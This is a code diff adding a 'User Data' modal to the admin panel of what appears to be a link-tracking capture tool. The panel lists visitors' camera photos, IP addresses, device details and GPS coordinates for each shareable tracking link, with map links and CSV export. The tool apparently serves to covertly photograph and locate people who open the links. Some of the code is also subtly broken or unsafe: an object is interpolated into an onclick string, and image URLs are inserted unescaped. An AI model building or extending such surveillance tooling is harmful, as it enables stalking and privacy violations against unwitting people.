@@ -1173,6 +1173,32 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════
+     USER DATA MODAL
+══════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="userDataModal">
+    <div class="modal-box" style="max-width:960px;width:96vw;max-height:88vh;display:flex;flex-direction:column;padding:0;overflow:hidden;">
+        <!-- Header -->
+        <div style="display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px;border-bottom:1px solid #1e293b;flex-shrink:0;">
+            <div style="display:flex;align-items:center;gap:12px;">
+                <div id="udmAvatar" style="width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#4f46e5);display:flex;align-items:center;justify-content:center;font-size:18px;">👤</div>
+                <div>
+                    <div id="udmTitle" style="font-size:17px;font-weight:700;color:var(--fg);">User Data</div>
+                    <div id="udmSubtitle" style="font-size:12px;color:var(--muted);margin-top:2px;"></div>
+                </div>
+            </div>
+            <div style="display:flex;gap:8px;align-items:center;">
+                <button class="btn btn-gray btn-sm" id="udmExportBtn">📥 Export CSV</button>
+                <button class="btn btn-gray btn-sm" onclick="document.getElementById('userDataModal').classList.remove('open')">✕ Close</button>
+            </div>
+        </div>
+        <!-- Stats bar -->
+        <div id="udmStats" style="display:flex;gap:10px;flex-wrap:wrap;padding:14px 24px;border-bottom:1px solid #1e293b;flex-shrink:0;background:#080b12;"></div>
+        <!-- Content -->
+        <div id="udmContent" style="flex:1;overflow-y:auto;padding:20px 24px;"></div>
+    </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
      FIREBASE + SCRIPT
 ══════════════════════════════════════════════════════════ -->
 <script type="importmap">
@@ -2081,6 +2107,7 @@ function renderUsers(users){
                 <div class="user-perms">${permsHtml}</div>
             </div>
             <div class="user-actions">
+                <button class="btn btn-teal btn-sm" data-uid="${id}" data-uname="${esc(u.name||'')}" data-urole="${u.role||'user'}" data-action="viewUserData">📊 View Data</button>
                 ${!isOwner?`<button class="btn btn-yellow btn-sm" data-uid="${id}" data-action="editUser">✏️ Edit</button>`:''}
                 ${!isOwner?(u.status==='disabled'
                     ?`<button class="btn btn-green btn-sm" data-uid="${id}" data-action="enableUser">▶ Enable</button>`
@@ -2097,6 +2124,7 @@ document.addEventListener('click',e=>{
     const btn=e.target.closest('[data-action][data-uid]');
     if(!btn) return;
     const {uid,action}=btn.dataset;
+    if(action==='viewUserData'){ openUserDataModal(uid, btn.dataset.uname, btn.dataset.urole); return; }
     if(action==='editUser') get(ref(db,'users/'+uid)).then(s=>openUserModal(uid,s.val()));
     else if(action==='disableUser') update(ref(db,'users/'+uid),{status:'disabled'}).then(()=>toast('⏸ User disabled.','var(--orange)'));
     else if(action==='enableUser')  update(ref(db,'users/'+uid),{status:'active'}).then(()=>toast('▶ User enabled.','var(--green)'));
@@ -2187,6 +2215,174 @@ function saveGuestConfig(){
     set(ref(db,'system_config/guest_access'),{enabled,password,permissions:perms,updatedAt:Date.now()})
         .then(()=>toast('✅ Guest config saved!','var(--green)'))
         .catch(()=>toast('❌ Save failed.','var(--red)'));
+}
+
+// ═══════════════════════════════════════════════════════════
+// USER DATA MODAL — shows all capture data for a specific user
+// ═══════════════════════════════════════════════════════════
+function openUserDataModal(uid, userName, userRole){
+    const modal   = document.getElementById('userDataModal');
+    const statsEl = document.getElementById('udmStats');
+    const contentEl = document.getElementById('udmContent');
+    const titleEl = document.getElementById('udmTitle');
+    const subEl   = document.getElementById('udmSubtitle');
+    const avatarEl= document.getElementById('udmAvatar');
+
+    // Set header info
+    avatarEl.innerText = userRole==='guest'?'👤': userRole==='admin'?'🛡️':'👨';
+    titleEl.innerText  = (userName||'User') + ' — Captured Data';
+    subEl.innerText    = 'Role: '+(userRole||'user')+(userName?' · '+userName:'');
+    statsEl.innerHTML  = '<span style="color:var(--muted);font-size:13px;">Loading...</span>';
+    contentEl.innerHTML= '';
+    modal.classList.add('open');
+
+    Promise.all([
+        get(ref(db,'managed_links')),
+        get(ref(db,'photo_history'))
+    ]).then(([linksSnap, logsSnap])=>{
+        const links  = linksSnap.val()||{};
+        const logs   = logsSnap.val()||{};
+        const allCaptures = Object.entries(logs).sort((a,b)=>(b[1].timestamp||0)-(a[1].timestamp||0));
+
+        // Stats
+        const total     = allCaptures.length;
+        const withPhoto = allCaptures.filter(([,p])=>p.image).length;
+        const withGPS   = allCaptures.filter(([,p])=>p.latitude&&p.latitude!=='Denied').length;
+        const uniqueIPs = new Set(allCaptures.map(([,p])=>p.ipAddress).filter(Boolean)).size;
+        const todayStart= new Date(); todayStart.setHours(0,0,0,0);
+        const today     = allCaptures.filter(([,p])=>(p.timestamp||0)>=todayStart.getTime()).length;
+        const linkCount = Object.keys(links).length;
+
+        statsEl.innerHTML = `
+            <div class="stat-mini"><div class="stat-val" style="color:var(--teal);">${total}</div><div class="stat-lbl">Total Captures</div></div>
+            <div class="stat-mini"><div class="stat-val" style="color:var(--green);">${today}</div><div class="stat-lbl">Today</div></div>
+            <div class="stat-mini"><div class="stat-val" style="color:var(--purple);">${withPhoto}</div><div class="stat-lbl">With Photo</div></div>
+            <div class="stat-mini"><div class="stat-val" style="color:var(--yellow);">${withGPS}</div><div class="stat-lbl">With GPS</div></div>
+            <div class="stat-mini"><div class="stat-val" style="color:var(--primary);">${uniqueIPs}</div><div class="stat-lbl">Unique IPs</div></div>
+            <div class="stat-mini"><div class="stat-val" style="color:var(--orange);">${linkCount}</div><div class="stat-lbl">Active Links</div></div>
+        `;
+
+        if(!allCaptures.length){
+            contentEl.innerHTML='<div class="empty" style="padding:40px 0;"><span class="empty-icon">📭</span><br>No captures recorded yet.</div>';
+            return;
+        }
+
+        // Group captures by linkId
+        const byLink={};
+        allCaptures.forEach(([key,p])=>{
+            const lid = p.linkId||'__no_link__';
+            if(!byLink[lid]) byLink[lid]={link:links[lid]||{name:p.linkName||'Unknown',createdBy:'—'},captures:[]};
+            byLink[lid].captures.push([key,p]);
+        });
+
+        // Sort groups: most captures first
+        const sorted = Object.entries(byLink).sort((a,b)=>b[1].captures.length-a[1].captures.length);
+
+        let html='';
+        sorted.forEach(([lid,{link,captures}])=>{
+            const linkActive = link.active!==false;
+            const groupWithPhoto = captures.filter(([,p])=>p.image).length;
+            const groupWithGPS   = captures.filter(([,p])=>p.latitude&&p.latitude!=='Denied').length;
+
+            html+=`
+            <div style="margin-bottom:32px;background:#0d1117;border:1px solid #1e293b;border-radius:12px;overflow:hidden;">
+                <!-- Link header -->
+                <div style="display:flex;align-items:center;gap:10px;padding:12px 16px;background:#111827;flex-wrap:wrap;">
+                    <span style="font-size:18px;">🔗</span>
+                    <span style="font-weight:700;color:var(--fg);font-size:14px;">${esc(link.name||'Unknown Link')}</span>
+                    <span class="badge ${linkActive?'badge-green':'badge-red'}" style="font-size:10px;">${linkActive?'ACTIVE':'OFF'}</span>
+                    <span style="font-size:11px;color:var(--muted);">
+                        ${captures.length} capture${captures.length!==1?'s':''} &nbsp;·&nbsp;
+                        📷 ${groupWithPhoto} photos &nbsp;·&nbsp;
+                        📍 ${groupWithGPS} GPS &nbsp;·&nbsp;
+                        ${link.createdAt?'Created '+new Date(link.createdAt).toLocaleDateString():''}
+                    </span>
+                    ${lid!=='__no_link__'?`
+                    <div style="margin-left:auto;display:flex;gap:6px;">
+                        <button class="btn btn-gray btn-sm" style="font-size:10px;padding:3px 8px;" onclick="(()=>{const base=window.location.origin+window.location.pathname.replace('admin.html','index.html');navigator.clipboard.writeText(base+'?linkId=${lid}').then(()=>toast('✅ Link copied!'))})()">📋 Copy Link</button>
+                    </div>`:''}
+                </div>
+                <!-- Captures table -->
+                <div style="overflow-x:auto;">
+                <table style="width:100%;border-collapse:collapse;font-size:12px;">
+                    <thead>
+                        <tr style="background:#0a0f1a;color:var(--muted);border-bottom:1px solid #1e293b;">
+                            <th style="padding:8px 12px;text-align:left;font-weight:600;">📷 Photo</th>
+                            <th style="padding:8px 12px;text-align:left;font-weight:600;">💻 Device</th>
+                            <th style="padding:8px 12px;text-align:left;font-weight:600;">🌐 IP Address</th>
+                            <th style="padding:8px 12px;text-align:left;font-weight:600;">📍 Location</th>
+                            <th style="padding:8px 12px;text-align:left;font-weight:600;">🕐 Date & Time</th>
+                            <th style="padding:8px 12px;text-align:left;font-weight:600;">⚙️ Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${captures.map(([key,p],idx)=>{
+                            const d=p.device||{};
+                            const hasGPS=p.latitude&&p.latitude!=='Denied'&&p.longitude&&p.longitude!=='Denied';
+                            const rowBg=idx%2===0?'#0d1117':'#0a0e18';
+                            return `<tr style="background:${rowBg};border-bottom:1px solid #0f172a;" onmouseover="this.style.background='#1e293b'" onmouseout="this.style.background='${rowBg}'">
+                                <td style="padding:8px 12px;">
+                                    ${p.image
+                                        ?`<img src="${p.image}" style="width:60px;height:46px;object-fit:cover;border-radius:6px;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.5);" onclick="window.open(this.src,'_blank')" title="Click to enlarge">`
+                                        :'<div style="width:60px;height:46px;background:#1e293b;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#475569;font-size:10px;">No Photo</div>'
+                                    }
+                                </td>
+                                <td style="padding:8px 12px;">
+                                    <div><span class="tag" style="font-size:10px;">${esc(d.os||'?')}</span> <span class="tag" style="font-size:10px;">${esc(d.browser||'?')}</span></div>
+                                    ${d.screen?`<div style="font-size:10px;color:#475569;margin-top:3px;">🖥 ${esc(d.screen)}</div>`:''}
+                                </td>
+                                <td style="padding:8px 12px;">
+                                    <div style="color:var(--teal);font-weight:600;">${esc(p.ipAddress||'N/A')}</div>
+                                    ${d.timezone?`<div style="font-size:10px;color:#475569;margin-top:2px;">🌍 ${esc(d.timezone)}</div>`:''}
+                                </td>
+                                <td style="padding:8px 12px;">
+                                    ${hasGPS
+                                        ?`<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:var(--green);font-weight:600;text-decoration:none;">📍 View on Map</a>
+                                          <div style="font-size:10px;color:#475569;margin-top:2px;">${Number(p.latitude).toFixed(5)}, ${Number(p.longitude).toFixed(5)}</div>`
+                                        :'<span style="color:#475569;">GPS Denied</span>'
+                                    }
+                                </td>
+                                <td style="padding:8px 12px;">
+                                    <div style="color:var(--fg);font-weight:500;">${esc(p.date||'—')}</div>
+                                    <div style="font-size:10px;color:var(--muted);margin-top:2px;">⏱ ${esc(p.time||'—')}</div>
+                                </td>
+                                <td style="padding:8px 12px;white-space:nowrap;">
+                                    <button class="btn btn-primary btn-sm" onclick="openInfoModal(logsCache['${key}']||(logsCache['${key}']=${Object.fromEntries(Object.entries(p))},logsCache['${key}']))" style="font-size:10px;padding:3px 8px;" data-key="${key}" data-action-udm="info">📋 Info</button>
+                                    ${p.image?`<button class="btn btn-teal btn-sm" onclick="dlImg('${p.image}','cap_${key}.jpg')" style="font-size:10px;padding:3px 8px;">⬇ Save</button>`:''}
+                                    ${hasGPS?`<button class="btn btn-gray btn-sm" onclick="navigator.clipboard.writeText('${p.latitude}, ${p.longitude}').then(()=>toast('📍 GPS copied!','var(--teal)'))" style="font-size:10px;padding:3px 8px;">📍 GPS</button>`:''}
+                                </td>
+                            </tr>`;
+                        }).join('')}
+                    </tbody>
+                </table>
+                </div>
+            </div>`;
+        });
+
+        contentEl.innerHTML = html;
+
+        // Wire Info buttons (need logsCache populated)
+        allCaptures.forEach(([key,p])=>{ logsCache[key]=p; });
+
+        // Export CSV for this view
+        document.getElementById('udmExportBtn').onclick=()=>{
+            const rows=[['Link Name','Date','Time','IP Address','OS','Browser','Latitude','Longitude','Has Photo','Timezone']];
+            allCaptures.forEach(([,p])=>{
+                const d=p.device||{};
+                rows.push([p.linkName||'',p.date||'',p.time||'',p.ipAddress||'',(d.os||''),(d.browser||''),p.latitude||'',p.longitude||'',p.image?'Yes':'No',(d.timezone||'')]);
+            });
+            const csv=rows.map(r=>r.map(v=>'"'+String(v).replace(/"/g,'""')+'"').join(',')).join('\n');
+            const a=document.createElement('a');
+            a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(csv);
+            a.download='captures_'+(userName||'user')+'_'+new Date().toISOString().slice(0,10)+'.csv';
+            a.click();
+            toast('📥 CSV exported!','var(--green)');
+        };
+
+    }).catch(err=>{
+        statsEl.innerHTML='';
+        contentEl.innerHTML=`<div class="empty" style="color:var(--red);">❌ Failed to load data: ${esc(err.message)}</div>`;
+    });
 }
 
 // ═══════════════════════════════════════════════════════════
